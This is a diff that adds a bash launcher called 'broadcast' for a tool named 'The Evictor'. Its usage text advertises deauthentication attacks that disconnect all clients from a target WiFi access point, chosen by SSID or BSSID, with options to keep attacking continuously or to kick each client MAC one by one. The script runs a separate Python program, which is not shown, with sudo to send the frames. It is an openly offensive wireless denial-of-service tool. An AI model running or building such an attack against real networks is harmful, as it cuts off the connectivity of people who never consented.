@@ -1,0 +1,44 @@
+﻿#!/usr/bin/env bash
+# =============================================================================
+#  broadcast — Evict ALL clients from a target AP simultaneously
+#  Usage:  ./broadcast [options]
+#  Examples:
+#    ./broadcast --ssid HomeNetwork
+#    ./broadcast --bssid 00:11:22:33:44:55 --channel 6 --continuous
+#    ./broadcast --ssid HomeNetwork --enum-clients   # kick each MAC individually
+# =============================================================================
+
+set -euo pipefail
+
+RED='\033[91m'; YLW='\033[93m'; GRN='\033[92m'
+CYN='\033[96m'; MAG='\033[95m'; RST='\033[0m'; BLD='\033[1m'
+
+banner() {
+  echo -e "${RED}${BLD}"
+  echo "  ╔═══════════════════════════════════════╗"
+  echo "  ║   THE EVICTOR  —  BROADCAST MODE      ║"
+  echo "  ║   All clients will be disconnected    ║"
+  echo "  ╚═══════════════════════════════════════╝"
+  echo -e "${RST}"
+}
+
+usage() {
+  echo -e "${BLD}Usage:${RST}  ./broadcast [OPTIONS]\n"
+  echo -e "  ${BLD}--ssid${RST}         <NAME>   Target SSID (auto-resolves BSSID)"
+  echo -e "  ${BLD}--bssid${RST}        <MAC>    Target AP MAC (use with --channel)"
+  echo -e "  ${BLD}--channel${RST}      <N>      AP channel"
+  echo -e "  ${BLD}--iface${RST}        <DEV>    Wireless interface (default: wlan0)"
+  echo -e "  ${BLD}--count${RST}        <N>      Deauth frames per burst (default: 64)"
+  echo -e "  ${BLD}--continuous${RST}             Keep kicking until Ctrl+C"
+  echo -e "  ${BLD}--enum-clients${RST}           Enumerate then kick each MAC individually"
+  echo
+  exit 1
+}
+
+[[ $# -lt 1 ]] && banner && usage
+
+banner
+echo -e "${YLW}[!]${RST} Broadcast deauth — targeting ALL clients"
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+exec sudo python3 "${SCRIPT_DIR}/evictor.py" "$@" broadcast
